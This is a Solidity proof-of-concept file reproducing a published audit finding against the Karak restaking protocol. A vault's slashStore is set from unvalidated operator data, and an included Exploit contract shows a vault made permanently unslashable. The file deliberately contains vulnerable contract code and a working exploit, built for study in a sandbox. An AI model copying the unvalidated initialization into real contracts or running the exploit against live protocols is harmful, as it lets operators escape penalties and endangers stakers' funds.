// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Karak — [H-02] Operator can create a NativeVault that is silently unslashable
    (Code4rena 2024-07-karak, finding #41066)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. The vulnerable
    NativeVault + Core (SlasherLib slashing loop) are inlined VERBATIM from the
    audited reduction; the Exploit contract deploys them and runs the whole attack
    in one transaction (no fork, no cheatcodes).

    Root cause: Core.deployVaults() passes operator-controlled `extraData`
    (manager, slashStore, node) straight into NativeVault.initialize() with NO
    validation. slashAssets() later reverts unless the protocol's whitelisted
    handler equals that operator-chosen slashStore. Setting slashStore to any other
    address makes every real slash revert -> the vault is permanently unslashable,
    so a misbehaving operator's stake can never be penalized.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Custom error preserved from NativeVault.
error NotSlashStore();

/// @dev Minimal faithful reduction of Karak's NativeVault.
///      Tracks staked native-ETH assets and is slashable by its owner (the Core contract).
contract NativeVault {
    struct State {
        address slashStore; // operator-controlled; set at init with NO validation
        address manager; // operator-controlled; set at init with NO validation
        uint256 totalAssets; // staked assets subject to slashing
    }

    State internal _s;
    address public core; // owner: the Core contract that deployed this vault
    address public asset;
    bool private _initialized;

    function _state() internal view returns (State storage) {
        return _s;
    }

    modifier onlyOwner() {
        require(msg.sender == core, "not owner");
        _;
    }

    /// @notice Deployed and initialized by `Core.deployVaults()`.
    ///         `extraData` is fully operator-controlled and is NOT validated here or in Core.
    function initialize(address _core, address _asset, bytes memory extraData) external {
        require(!_initialized, "init");
        _initialized = true;
        core = _core;
        asset = _asset;
        // @> operator-supplied slashStore is stored verbatim — never checked against the
        //    protocol's whitelisted slashing handler for `asset`. This missing validation
        //    is the root cause: the operator can point slashStore anywhere.
        (address manager, address slashStore,) = abi.decode(extraData, (address, address, address));
        _state().slashStore = slashStore;
        _state().manager = manager;
    }

    /// @notice Models native ETH staked into the vault (subject to slashing).
    function stake(uint256 amount) external {
        _state().totalAssets += amount;
    }

    function totalAssets() external view returns (uint256) {
        return _state().totalAssets;
    }

    /// @notice Called by Core during slashing with the protocol's whitelisted
    ///         `slashingHandler` for the vault's asset (see SlasherLib loop below).
    function slashAssets(uint256 totalAssetsToSlash, address slashingHandler)
        external
        onlyOwner
        returns (uint256 transferAmount)
    {
        State storage self = _state();
        if (slashingHandler != self.slashStore) revert NotSlashStore(); // @> NativeVault.sol:L308
        transferAmount = totalAssetsToSlash;
        self.totalAssets -= transferAmount;
    }
}

/// @dev Minimal faithful reduction of Karak's Core + SlasherLib.
contract Core {
    struct VaultConfig {
        address asset;
        address operator;
        bytes extraData;
    }

    mapping(address asset => address slashingHandler) public assetSlashingHandlers;
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    /// @notice Protocol admin whitelists the canonical slashing handler for an asset.
    function allowlistAsset(address asset, address slashingHandler) external {
        require(msg.sender == owner, "not owner");
        assetSlashingHandlers[asset] = slashingHandler;
    }

    /// @notice Operator entrypoint. `extraData` flows straight into the vault's initialize()
    ///         with NO validation of the operator-chosen slashStore.
    function deployVaults(VaultConfig[] memory configs) external returns (address[] memory vaults) {
        vaults = new address[](configs.length);
        for (uint256 i = 0; i < configs.length; i++) {
            NativeVault v = new NativeVault();
            v.initialize(address(this), configs[i].asset, configs[i].extraData);
            vaults[i] = address(v);
        }
    }

    /// @notice Mirrors SlasherLib.slashAssets: passes the whitelisted handler per asset.
    ///         (src/entities/SlasherLib.sol#L134-L138)
    function finalizeSlashing(address[] memory vaults, uint256[] memory earmarkedStakes) external {
        for (uint256 i = 0; i < vaults.length; i++) {
            NativeVault(vaults[i]).slashAssets(
                earmarkedStakes[i], assetSlashingHandlers[NativeVault(vaults[i]).asset()]
            );
        }
    }
}

/// @dev A marker ERC20 minted to the attacker equal to the stake made permanently
///      unslashable. Not part of the protocol — it exists only so the Playground can
///      display the harm as a concrete number ("stake shielded from slashing").
contract Shield {
    string public name = "Stake shielded from slashing";
    string public symbol = "SHIELD";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }
}

/// @dev The attacker/operator. Deploys the vulnerable restaking Core locally and shows
///      that a poisoned slashStore makes the vault permanently unslashable (one tx, no cheats).
contract Exploit {
    // Constants.DEAD_BEEF — Karak's placeholder asset id for native ETH.
    address constant ETH = address(0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF);
    address constant LEGIT_HANDLER = address(0x1111); // whitelisted ETH slashing handler
    address constant MANAGER = address(0xB0B);
    address constant NODE_IMPL = address(0xC0DE);
    address constant BAD_SLASH_STORE = address(666); // operator-chosen, != LEGIT_HANDLER

    Core public core;
    Shield public shield;
    address public attacker;

    NativeVault public honestVault; // control: correctly configured, slashable
    NativeVault public badVault;    // attack: poisoned slashStore, unslashable
    bool public slashReverted;
    uint256 public stakeShielded;

    constructor() {
        attacker = msg.sender;
        core = new Core();
        shield = new Shield();
    }

    function _deployVault(address slashStore) internal returns (NativeVault v) {
        Core.VaultConfig[] memory cfgs = new Core.VaultConfig[](1);
        cfgs[0] = Core.VaultConfig({
            asset: ETH,
            operator: address(this),
            extraData: abi.encode(MANAGER, slashStore, NODE_IMPL) // operator-controlled, unvalidated
        });
        address[] memory vaults = core.deployVaults(cfgs);
        v = NativeVault(vaults[0]);
        v.stake(100 ether); // operator has 100 ETH of stake at risk
    }

    function run() external {
        // Protocol admin whitelists the canonical ETH slashing handler.
        core.allowlistAsset(ETH, LEGIT_HANDLER);

        // Control: an honestly-configured vault (slashStore == whitelisted handler) IS slashable.
        honestVault = _deployVault(LEGIT_HANDLER);
        address[] memory hv = new address[](1);
        hv[0] = address(honestVault);
        uint256[] memory hAmt = new uint256[](1);
        hAmt[0] = 10 ether;
        core.finalizeSlashing(hv, hAmt); // succeeds: honest vault drops 100 -> 90

        // Attack: operator points slashStore at an arbitrary address, poisoning the vault.
        badVault = _deployVault(BAD_SLASH_STORE);
        address[] memory bv = new address[](1);
        bv[0] = address(badVault);
        uint256[] memory bAmt = new uint256[](1);
        bAmt[0] = 10 ether;

        // The protocol's legitimate slash of the misbehaving operator reverts forever.
        try core.finalizeSlashing(bv, bAmt) {
            slashReverted = false;
        } catch {
            slashReverted = true;
        }

        // HARM: the slash could not be applied and the operator keeps 100% of stake.
        require(slashReverted, "slash unexpectedly succeeded");
        require(badVault.totalAssets() == 100 ether, "stake should be untouched");
        stakeShielded = badVault.totalAssets(); // 100 ETH permanently unslashable
        shield.mint(attacker, stakeShielded);
    }
}
